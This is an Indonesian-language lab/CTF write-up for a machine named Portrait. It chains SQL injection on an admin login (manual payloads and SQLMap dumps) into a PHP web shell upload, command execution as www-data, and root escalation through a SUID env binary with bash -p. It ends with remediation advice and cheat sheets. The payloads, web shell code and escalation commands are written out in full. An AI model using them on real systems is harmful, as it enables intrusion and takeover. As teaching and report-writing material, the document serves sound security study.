# 02 Write-Up Lab Portrait
## SQL Injection → Credential Admin → Unrestricted File Upload → RCE `www-data` → SUID `env` → Root

> **Ruang lingkup:** hanya untuk laboratorium, CTF, pembelajaran, atau pengujian yang memiliki izin tertulis.
>
> Dokumen ini menggabungkan versi **pembahasan detail** dan **close book** agar dapat digunakan untuk belajar konsep, mendokumentasikan evidence, sekaligus menjadi panduan cepat saat ujian.

---

## 1. Tujuan Pembelajaran

Setelah menyelesaikan lab ini, peserta diharapkan mampu:

1. melakukan reconnaissance terhadap aplikasi web;
2. mengidentifikasi parameter login yang rentan SQL Injection;
3. melakukan enumerasi database secara bertahap menggunakan SQLMap;
4. memperoleh credential administrator dari database;
5. mengeksploitasi fitur upload file hingga memperoleh command execution;
6. melakukan enumerasi binary SUID;
7. mengeksploitasi miskonfigurasi SUID pada `/usr/local/bin/env` untuk memperoleh effective UID root; dan
8. menyusun evidence dan rekomendasi perbaikan secara sistematis.

---

## 2. Gambaran Besar Attack Chain

```text
Recon port 8080
→ temukan /administrator, /profile, dan /uploads
→ baseline request login
→ SQL Injection pada parameter username
→ cari current database
→ enumerasi tabel dan kolom
→ dump tabel users
→ dapat credential admin
→ login ke aplikasi
→ upload file PHP
→ akses file melalui /uploads
→ RCE sebagai www-data
→ enumerasi binary SUID
→ temukan /usr/local/bin/env dengan SUID root
→ jalankan /bin/bash -p
→ command berjalan sebagai root
→ cari dan baca flag
```

### Ringkasan Hubungan Antarcelah

```text
SQL Injection
    ↓
Credential Administrator
    ↓
Unrestricted File Upload
    ↓
Remote Code Execution sebagai www-data
    ↓
Miskonfigurasi SUID pada /usr/local/bin/env
    ↓
Privilege Escalation menjadi root
```

---

## 3. Data Hafalan Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.128` |
| Web | `http://192.168.56.128:8080` |
| Login administrator | `/administrator` |
| Fitur upload | `/profile` |
| Direktori upload | `/uploads` |
| Database | `portrait` |
| Tabel credential | `users` |
| Credential | `admin:AdminPortr417126` |
| Web shell | `/uploads/cakgup1.php` |
| User awal | `www-data` |
| SUID rentan | `/usr/local/bin/env` (`-rwsr-xr-x`, owner `root`) |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

Set variabel agar command berikutnya lebih mudah digunakan:

```bash
TARGET="192.168.56.128"
WEB="http://192.168.56.128:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

---

# BAGIAN A — PEMBAHASAN DETAIL

## 4. Fase 1 — Reconnaissance Service

### Tujuan

Menentukan service yang berjalan pada port aplikasi dan memperoleh informasi awal teknologi target.

### Command

```bash
nmap -sC -sV -p- "$TARGET"
```

### Output yang Diharapkan

```text
8080/tcp open  http
```

### Interpretasi

Port `8080` terbuka dan melayani aplikasi web. Selanjutnya lakukan enumerasi direktori untuk menemukan endpoint yang tidak terlihat langsung dari halaman utama.

---

## 5. Fase 2 — Enumerasi Direktori

### Command

```bash
dirsearch -u "$WEB" -e php,html,txt
```

Alternatif apabila `dirsearch` tidak tersedia:

```bash
feroxbuster -u "$WEB" -x php,html,txt
```

### Temuan Utama

```text
/administrator
/profile
/uploads
```

### Fungsi Endpoint

| Endpoint | Fungsi yang Diperkirakan |
|---|---|
| `/administrator` | Login administrator dan titik uji SQL Injection |
| `/profile` | Pengelolaan profil dan upload avatar/file |
| `/uploads` | Lokasi file hasil upload disajikan oleh web server |

> Temuan direktori belum membuktikan kerentanan. Setiap endpoint harus diuji secara manual dan didokumentasikan.

---

## 6. Fase 3 — Baseline Request Login

### Tujuan

Mengetahui method, nama parameter, cookie, dan pola respons login sebelum melakukan pengujian SQL Injection.

### Kirim Login Salah

```bash
curl -sS \
  -D login-failed.headers \
  -o login-failed.html \
  -c login.cookies \
  -X POST "$WEB/administrator/" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=InvalidPassword123!"
```

### Periksa Respons

```bash
cat login-failed.headers

grep -Ein \
  'invalid|incorrect|failed|error|username|password|dashboard|logout' \
  login-failed.html

wc -c login-failed.html
```

### Output Contoh

```text
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=...
```

### Informasi yang Diperoleh

- endpoint login menerima request `POST`;
- parameter login bernama `username` dan `password`;
- aplikasi menggunakan session cookie;
- request dapat direplikasi dengan `curl`, Burp Repeater, atau SQLMap;
- respons login gagal menjadi pembanding saat menguji payload.

---

## 7. Fase 4 — Uji SQL Injection Manual

### Payload Dasar

```text
' OR '1'='1
```

Alternatif:

```text
admin'-- -
```

### Contoh dengan `curl`

```bash
curl -sS \
  -X POST "$LOGIN_URL" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=test" \
  -D sqli-test.headers \
  -o sqli-test.html
```

Bandingkan respons dengan login gagal:

```bash
grep -Ein 'dashboard|logout|welcome|admin|invalid|failed' sqli-test.html
wc -c login-failed.html sqli-test.html
```

### Konsep Kerentanan

Aplikasi kemungkinan menyusun query dengan menggabungkan input pengguna secara langsung, misalnya:

```sql
SELECT * FROM users
WHERE username = '$username'
  AND password = '$password';
```

Payload dapat mengubah logika query menjadi kondisi yang selalu benar atau mengomentari bagian query setelah input.

> Uji manual berguna untuk memahami perilaku aplikasi. SQLMap kemudian dipakai agar enumerasi database lebih konsisten dan evidence lebih mudah ditelusuri.

---

## 8. Fase 5 — SQLMap: Konfirmasi dan Cari Current Database

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db
```

### Parameter Penting

| Parameter | Fungsi |
|---|---|
| `-u` | URL endpoint target |
| `--data` | Data request POST |
| `-p username` | Hanya menguji parameter `username` |
| `--batch` | Menggunakan jawaban default tanpa prompt interaktif |
| `--current-db` | Menampilkan database aktif |

### Evidence

```text
current database: 'portrait'
```

### Interpretasi

Nama database `portrait` diketahui dari proses enumerasi, bukan ditebak. Tahap ini penting dalam write-up agar alur penemuan dapat direproduksi.

---

## 9. Fase 6 — SQLMap: Enumerasi Tabel

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  --tables
```

### Evidence

```text
Database: portrait
[...]
users
```

### Interpretasi

Tabel `users` menjadi kandidat utama karena kemungkinan menyimpan informasi akun dan credential aplikasi.

---

## 10. Fase 7 — SQLMap: Enumerasi Kolom

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --columns
```

### Output Contoh

```text
Database: portrait
Table: users
[...]
username
password
```

### Interpretasi

Tahap ini menjelaskan alasan pemilihan kolom credential. Saat ujian cepat, `--dump` dapat dilakukan langsung setelah menemukan tabel, tetapi dalam laporan pembelajaran sebaiknya alur enumerasi ditampilkan lengkap.

---

## 11. Fase 8 — SQLMap: Dump Credential Administrator

### Command

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

### Evidence

```text
Username : admin
Password : AdminPortr417126
```

### Hasil

```text
admin:AdminPortr417126
```

### Makna Temuan

SQL Injection tidak hanya memungkinkan bypass login, tetapi juga membaca isi database dan memperoleh credential administrator yang valid.

---

## 12. Fase 9 — Login Administrator

Akses:

```text
http://192.168.56.128:8080/administrator
```

Credential:

```text
Username : admin
Password : AdminPortr417126
```

Setelah login, buka:

```text
http://192.168.56.128:8080/profile
```

Cari fitur upload avatar atau upload file.

---

## 13. Fase 10 — Membuat PHP Command Runner

### Buat File

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

### Cara Kerja

Kode PHP membaca parameter `cmd`, lalu menjalankannya melalui fungsi `system()`.

Contoh request:

```text
/uploads/cakgup.php?cmd=id
```

Setara dengan menjalankan:

```bash
id
```

pada server target.

---

## 14. Fase 11 — Upload Web Shell

Upload `cakgup.php` melalui fitur pada `/profile`.

### Hal yang Perlu Diamati

- apakah aplikasi memeriksa ekstensi file;
- apakah aplikasi hanya memeriksa nilai `Content-Type`;
- apakah nama file diubah oleh server;
- apakah file disimpan di `/uploads`;
- apakah direktori upload mengeksekusi PHP;
- apakah URL file ditampilkan setelah upload.

### Jika Aplikasi Hanya Memeriksa MIME

Gunakan Burp Suite untuk mengubah bagian multipart seperti berikut:

```http
Content-Type: image/jpeg
```

Isi file tetap:

```php
<?php system($_GET['cmd']); ?>
```

> Perubahan MIME hanya relevan apabila validasi aplikasi memang bergantung pada header tersebut. Jangan mengasumsikan satu bypass berlaku pada semua aplikasi.

---

## 15. Fase 12 — Validasi Remote Code Execution

### Tujuan

Membuktikan bahwa file PHP yang berhasil diunggah tidak hanya dapat diakses, tetapi juga dieksekusi oleh web server untuk menjalankan perintah sistem operasi.

### Validasi Awal

```bash
curl "http://192.168.56.128:8080/uploads/cakgup.php?cmd=id"
```

### Evidence

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Interpretasi

Output `id` membuktikan bahwa:

- file `cakgup.php` berhasil disimpan pada direktori `/uploads`;
- file dapat diakses secara langsung melalui HTTP;
- web server memproses file tersebut sebagai script PHP;
- parameter `cmd` diteruskan ke sistem operasi; dan
- perintah dijalankan menggunakan akun layanan web `www-data`.

Dengan demikian, temuan telah berkembang dari **unrestricted file upload** menjadi **remote code execution (RCE)**.

### Menetapkan Variabel Target

Agar command berikutnya lebih ringkas, URL web shell disimpan dalam variabel:

```bash
TARGET="http://192.168.56.128:8080/uploads/cakgup.php"
```

---

## 16. Fase 13 — Identifikasi Konteks Sistem

### Command

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=id; whoami; hostname; uname -a; cat /etc/os-release"
```

### Evidence

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
portrait
Linux portrait 5.15.0-178-generic #188-Ubuntu SMP Sun Apr 12 07:19:49 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

### Hasil Identifikasi

| Informasi | Hasil |
|---|---|
| User proses | `www-data` |
| UID/GID | `33/33` |
| Hostname | `portrait` |
| Sistem operasi | Ubuntu 22.04.5 LTS |
| Kernel | Linux 5.15.0-178-generic |
| Arsitektur | x86_64 |

### Interpretasi

RCE masih berada pada konteks akun berprivilege rendah. Tahap berikutnya adalah mencari miskonfigurasi lokal yang dapat digunakan untuk meningkatkan hak akses.

---

## 17. Fase 14 — Enumerasi Binary SUID

### Tujuan

Mencari executable yang memiliki bit **Set User ID (SUID)**. Saat binary SUID dijalankan, proses dapat memperoleh effective UID milik pemilik file, yang umumnya `root`.

### Command

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
```

### Evidence

```text
/usr/local/bin/env
/usr/bin/su
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/lib/openssh/ssh-keysign

```

### Temuan Utama

Binary berikut tidak lazim memiliki bit SUID dan perlu diperiksa lebih lanjut:

```text
/usr/local/bin/env
```

Binary standar seperti `passwd`, `su`, atau `sudo` memang dapat memiliki SUID karena kebutuhan fungsionalnya. Sebaliknya, salinan `env` pada `/usr/local/bin` dengan SUID root merupakan indikasi miskonfigurasi berisiko tinggi karena `env` dapat digunakan untuk menjalankan program lain.

---

## 18. Memahami Risiko SUID pada `/usr/local/bin/env`

### Pemeriksaan Permission

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=ls -l /usr/local/bin/env"
```

### Evidence

```text
-rwsr-xr-x 1 root root 43976 Jun 27 19:36 /usr/local/bin/env
```

Karakter `s` pada bagian permission pemilik:

```text
-rwsr-xr-x
   ^
```

menunjukkan bahwa bit SUID aktif. Karena file dimiliki oleh `root`, program yang dijalankan melalui binary tersebut dapat mewarisi **effective UID root**.

### Mengapa `bash -p` Digunakan?

Secara default, Bash dapat menurunkan privilege ketika mendeteksi perbedaan antara real UID dan effective UID. Opsi:

```text
-p
```

mempertahankan privileged mode sehingga effective UID yang diperoleh dari binary SUID tidak langsung dilepas.

### Validasi Terpadu

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=ls -l /usr/local/bin/env; /usr/local/bin/env /bin/bash -p -c 'id; whoami; echo EUID=\$EUID'"
```

### Evidence

```text
-rwsr-xr-x 1 root root 43976 Jun 27 19:36 /usr/local/bin/env
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
EUID=0
```

### Interpretasi

Output tersebut menunjukkan:

- **real UID** tetap `33` atau `www-data`;
- **effective UID** berubah menjadi `0` atau `root`;
- `whoami` menampilkan `root`; dan
- command yang dijalankan oleh Bash memperoleh privilege root.

Hal ini membuktikan bahwa SUID pada `/usr/local/bin/env` dapat dieksploitasi untuk melakukan privilege escalation.

---

## 19. Fase 15 — Validasi Privilege Escalation

### Proof of Concept Minimal

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id'"
```

### Evidence

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

### Validasi Akses Direktori Root

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'ls -la /root'"
```

### Evidence

```text
total 36
drwx------  6 root root 4096 Jun 28 05:14 .
drwxr-xr-x 20 root root 4096 Jun 27 19:23 ..
-rw-r--r--  1 root root    0 Jun 28 05:14 .bash_history
-rw-r--r--  1 root root 3163 Jun 27 20:00 .bashrc
drwx------  4 root root 4096 Jun 27 19:57 .cache
drwx------  5 root root 4096 Jun 27 19:55 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Jun 27 17:11 .ssh
-rw-------  1 root root   33 Jun 27 19:36 FLAG.txt
drwx------  3 root root 4096 Jun 28 05:14 snap
```

### Interpretasi

Akun `www-data` pada kondisi normal tidak memiliki izin membaca isi `/root`. Keberhasilan menampilkan direktori tersebut membuktikan bahwa command telah berjalan dengan effective UID root, bukan sekadar menampilkan teks atau hasil simulasi.

---

## 20. Fase 16 — Mencari File Flag

### Command

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'find / -type f -iname flag.txt 2>/dev/null'"
```

### Evidence

```text
/root/FLAG.txt
/FLAG.txt
```

### Interpretasi

Ditemukan dua file flag:

| Path | Konteks |
|---|---|
| `/FLAG.txt` | Flag tahap RCE sebagai user web |
| `/root/FLAG.txt` | Flag tahap privilege escalation menjadi root |

Pencarian dilakukan setelah memperoleh privilege root agar file pada direktori terproteksi dapat ditemukan tanpa terhalang permission.

---

## 21. Fase 17 — Membaca Flag

### Command

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'cat /root/FLAG.txt; cat /FLAG.txt'"
```

### Evidence

```text
FLAG{3nv_3x3c5_r007_1n_p0r7r417}
FLAG{w3b_2_wwwd474_1n_7h3_p0r7r417}
```

### Hasil Akhir

| Tahap | Flag |
|---|---|
| Root privilege escalation | `FLAG{3nv_3x3c5_r007_1n_p0r7r417}` |
| Web RCE sebagai `www-data` | `FLAG{w3b_2_wwwd474_1n_7h3_p0r7r417}` |

Keberhasilan membaca `/root/FLAG.txt` merupakan bukti akhir bahwa rangkaian eksploitasi telah mencapai kompromi penuh pada sistem operasi.

---

# BAGIAN B — ANALISIS TEMUAN

## 22. Temuan 1 — SQL Injection pada Login Administrator

### Judul yang Disarankan

```text
SQL Injection pada Parameter username di Endpoint /administrator
Memungkinkan Pembacaan Database dan Pengambilalihan Akun Administrator
```

### Akar Masalah

- input pengguna digabung langsung ke query SQL;
- aplikasi tidak menggunakan parameterized query atau prepared statement;
- validasi input tidak memisahkan data pengguna dari perintah SQL;
- akun database aplikasi memiliki privilege yang memungkinkan pembacaan tabel credential; dan
- password administrator tersimpan atau dapat diperoleh dalam bentuk yang dapat langsung digunakan.

### Dampak

- bypass autentikasi;
- pembacaan data sensitif;
- pengambilalihan akun administrator;
- manipulasi atau penghapusan data; dan
- menjadi titik awal rangkaian eksploitasi menuju kompromi server.

### Rekomendasi

1. gunakan prepared statement atau parameterized query;
2. hindari penyusunan query melalui string concatenation;
3. terapkan prinsip least privilege pada akun database aplikasi;
4. simpan password menggunakan hashing adaptif seperti Argon2id atau bcrypt;
5. samakan respons autentikasi gagal;
6. tambahkan logging dan alert untuk pola injeksi; dan
7. lakukan pengujian SAST, DAST, dan code review pada pipeline pengembangan.

---

## 23. Temuan 2 — Unrestricted File Upload Menjadi RCE

### Judul yang Disarankan

```text
Unrestricted File Upload pada Fitur Profile Memungkinkan Eksekusi
Kode PHP sebagai User www-data
```

### Akar Masalah

- aplikasi tidak menerapkan allowlist format file yang kuat;
- validasi dapat dilewati melalui manipulasi metadata file;
- file disimpan pada direktori yang dapat diakses langsung dari web;
- direktori `/uploads` mengizinkan eksekusi script PHP; dan
- nama serta lokasi file hasil upload dapat diketahui oleh pengguna.

### Dampak

- remote command execution sebagai `www-data`;
- pembacaan konfigurasi dan source code aplikasi;
- pencurian credential;
- modifikasi atau penghapusan data;
- pivot ke layanan internal; dan
- akses awal untuk melakukan privilege escalation pada host.

### Rekomendasi

1. terapkan allowlist ekstensi dan tipe file yang benar-benar diperlukan;
2. verifikasi tipe file berdasarkan isi, magic bytes, dan proses decoding;
3. lakukan re-encoding pada file gambar;
4. simpan file di luar web root;
5. gunakan nama file acak yang dibuat server;
6. nonaktifkan eksekusi PHP atau script pada direktori upload;
7. sajikan file melalui endpoint download terkontrol;
8. batasi ukuran file dan lakukan pemindaian malware; dan
9. jalankan layanan web menggunakan privilege minimum dan sandbox yang sesuai.

---

## 24. Temuan 3 — SUID Tidak Aman pada `/usr/local/bin/env`

### Judul yang Disarankan

```text
Miskonfigurasi SUID pada /usr/local/bin/env Memungkinkan Privilege
Escalation dari www-data Menjadi Root
```

### Akar Masalah

Binary `/usr/local/bin/env` dimiliki oleh `root` dan memiliki bit SUID:

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/env
```

Utility `env` dapat menjalankan program lain. Ketika digunakan untuk menjalankan `/bin/bash -p`, Bash mempertahankan effective UID root yang diwariskan dari binary SUID.

### Dampak

- proses web berprivilege rendah dapat menjalankan command dengan EUID `0`;
- file milik root dapat dibaca atau diubah;
- konfigurasi sistem dapat dimodifikasi;
- persistence dan pengambilalihan penuh host menjadi memungkinkan; dan
- confidentiality, integrity, serta availability server terancam sepenuhnya.

### Rekomendasi

Hapus bit SUID dari binary tersebut:

```bash
sudo chmod u-s /usr/local/bin/env
```

Apabila file tersebut bukan bagian dari kebutuhan sistem, hapus salinan yang tidak diperlukan:

```bash
sudo rm -f /usr/local/bin/env
```

Verifikasi setelah perbaikan:

```bash
ls -l /usr/local/bin/env
find / -perm -4000 -type f 2>/dev/null
```

Tambahan pengamanan:

- audit seluruh binary SUID secara berkala;
- bandingkan daftar SUID dengan baseline sistem yang disetujui;
- hindari SUID pada interpreter, shell, editor, atau utility serbaguna;
- gunakan file integrity monitoring untuk mendeteksi perubahan permission;
- batasi kemampuan proses web melalui AppArmor, SELinux, container, atau systemd sandboxing; dan
- selidiki proses atau mekanisme yang membuat salinan `/usr/local/bin/env` tersebut.

---

## 25. Ringkasan Risiko Chained Exploit

| Tahap | Kerentanan | Hasil |
|---|---|---|
| 1 | SQL Injection | Credential administrator diperoleh |
| 2 | Unrestricted file upload | File PHP dapat dieksekusi |
| 3 | Remote code execution | Command berjalan sebagai `www-data` |
| 4 | SUID tidak aman pada `env` | Effective UID berubah menjadi root |
| 5 | Root compromise | Seluruh sistem dan flag terproteksi dapat diakses |

### Dampak Akhir

```text
Unauthenticated attacker
→ administrator aplikasi
→ upload PHP
→ RCE sebagai www-data
→ eksploitasi SUID /usr/local/bin/env
→ effective UID root
→ kompromi penuh server
```

Severity keseluruhan layak dinilai **Critical** karena rangkaian eksploitasi berakhir pada pengambilalihan penuh sistem operasi.

---

# BAGIAN C — EVIDENCE DAN TROUBLESHOOTING

## 26. Checklist Evidence

Simpan bukti berikut untuk write-up atau laporan:

- [ ] hasil Nmap yang menunjukkan port `8080`;
- [ ] hasil enumerasi direktori;
- [ ] request dan respons baseline login gagal;
- [ ] parameter `username` yang terkonfirmasi rentan;
- [ ] output SQLMap `--current-db`, `--tables`, `--columns`, dan `--dump`;
- [ ] credential administrator yang diperoleh;
- [ ] screenshot login administrator;
- [ ] request upload file dan respons server;
- [ ] URL file hasil upload;
- [ ] output `id` sebagai `www-data`;
- [ ] output `hostname`, `uname -a`, dan `/etc/os-release`;
- [ ] daftar binary SUID;
- [ ] permission `/usr/local/bin/env` yang menunjukkan `-rwsr-xr-x`;
- [ ] output `id` yang menunjukkan `euid=0(root)`;
- [ ] bukti akses ke direktori `/root`;
- [ ] hasil pencarian `/root/FLAG.txt` dan `/FLAG.txt`; dan
- [ ] hasil pembacaan kedua flag.

---

## 27. Troubleshooting

| Masalah | Kemungkinan Penyebab | Solusi |
|---|---|---|
| Web shell mengembalikan `404` | Nama atau lokasi file berubah | Periksa respons upload dan source halaman untuk menemukan path aktual |
| PHP tampil sebagai teks | Direktori upload tidak mengeksekusi PHP | Jangan klaim RCE; evaluasi konfigurasi penyimpanan dan handler PHP |
| Parameter `cmd` tidak menghasilkan output | Fungsi PHP dibatasi atau format request salah | Uji `id` terlebih dahulu dan gunakan `--data-urlencode` |
| Command terpotong pada karakter khusus | Encoding query tidak tepat | Gunakan `curl -sG` dan `--data-urlencode` |
| `find / -perm -4000` terlalu banyak error | Banyak direktori tidak dapat dibaca | Tambahkan `2>/dev/null` |
| `/usr/local/bin/env` tidak ditemukan | Binary atau path berbeda | Gunakan output enumerasi SUID aktual, jangan menebak path |
| `bash -p` tidak memperoleh EUID root | SUID telah dihapus atau filesystem memakai `nosuid` | Verifikasi dengan `ls -l`, `mount`, dan output `id` |
| `whoami` root tetapi `uid` masih 33 | Hanya effective UID yang berubah | Periksa `euid=0`; effective UID menentukan akses privilege proses |
| Tidak dapat membaca `/root` | Privilege tidak dipertahankan | Pastikan command dijalankan melalui `/usr/local/bin/env /bin/bash -p -c` |
| Flag tidak ditemukan | Penamaan atau kapitalisasi berbeda | Gunakan `find / -type f -iname 'flag.txt' 2>/dev/null` |

### Command Diagnostik Ringkas

```bash
curl -sG "$TARGET" --data-urlencode "cmd=ls -l /usr/local/bin/env"

curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami; echo EUID=\$EUID'"
```

---

# BAGIAN D — CLOSE BOOK

## 28. Alur Hafalan

```text
Recon port 8080
→ SQL Injection login administrator
→ dump credential admin
→ login dan upload cakgup1.php
→ akses /uploads/cakgup1.php?cmd=id
→ RCE sebagai www-data
→ find SUID
→ temukan /usr/local/bin/env
→ jalankan env /bin/bash -p
→ euid=0(root)
→ cari /root/FLAG.txt dan /FLAG.txt
→ baca kedua flag
```

---

## 29. Close Book — Langkah Singkat

### 29.1 Set Target Web Shell

```bash
TARGET="http://192.168.56.128:8080/uploads/cakgup1.php"
```

### 29.2 Validasi RCE

```bash
curl "$TARGET?cmd=id"
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 29.3 Identifikasi Sistem

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=id; whoami; hostname; uname -a; cat /etc/os-release"
```

### 29.4 Cari Binary SUID

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"
```

Temuan penting:

```text
/usr/local/bin/env
```

### 29.5 Validasi Permission

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=ls -l /usr/local/bin/env"
```

Expected:

```text
-rwsr-xr-x 1 root root ... /usr/local/bin/env
```

### 29.6 Eskalasi Menjadi Root

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id; whoami; echo EUID=\$EUID'"
```

Expected:

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
EUID=0
```

### 29.7 Cari dan Baca Flag

```bash
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'find / -type f -iname flag.txt 2>/dev/null'"

curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'cat /root/FLAG.txt; cat /FLAG.txt'"
```

---

## 30. Cheat Sheet Paling Pendek

```bash
TARGET="http://192.168.56.128:8080/uploads/cakgup1.php"

# RCE sebagai www-data
curl "$TARGET?cmd=id"

# Informasi sistem
curl -sG "$TARGET" \
  --data-urlencode "cmd=id;whoami;hostname;uname -a;cat /etc/os-release"

# Cari SUID
curl -sG "$TARGET" \
  --data-urlencode "cmd=find / -perm -4000 -type f 2>/dev/null"

# Cek binary rentan
curl -sG "$TARGET" \
  --data-urlencode "cmd=ls -l /usr/local/bin/env"

# Root
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'id;whoami;echo EUID=\$EUID'"

# Cari dan baca flag
curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'find / -type f -iname flag.txt 2>/dev/null'"

curl -sG "$TARGET" \
  --data-urlencode "cmd=/usr/local/bin/env /bin/bash -p -c 'cat /root/FLAG.txt;cat /FLAG.txt'"
```

---

## 31. Ringkasan Satu Paragraf

Setelah memperoleh credential administrator melalui SQL Injection, penguji masuk ke aplikasi dan mengunggah file PHP `cakgup1.php` melalui fitur profile. File tersebut dapat diakses melalui `/uploads` dan menjalankan command sistem sebagai `www-data`, sehingga unrestricted file upload terkonfirmasi menjadi remote code execution. Enumerasi lokal menggunakan pencarian binary SUID menemukan `/usr/local/bin/env` dengan permission `-rwsr-xr-x` dan kepemilikan `root`. Binary tersebut digunakan untuk menjalankan `/bin/bash -p`, yang mempertahankan effective UID root. Evidence `id` menunjukkan `uid=33(www-data)` dan `euid=0(root)`, sedangkan `whoami` menghasilkan `root`. Dengan privilege tersebut, penguji dapat mengakses direktori `/root`, menemukan `/root/FLAG.txt` dan `/FLAG.txt`, serta membaca kedua flag sebagai bukti kompromi penuh server.

---

## 32. Formula Hafalan

```text
R.S.U.S.R

R = Recon
S = SQL Injection
U = Upload PHP
S = SUID env
R = Root
```
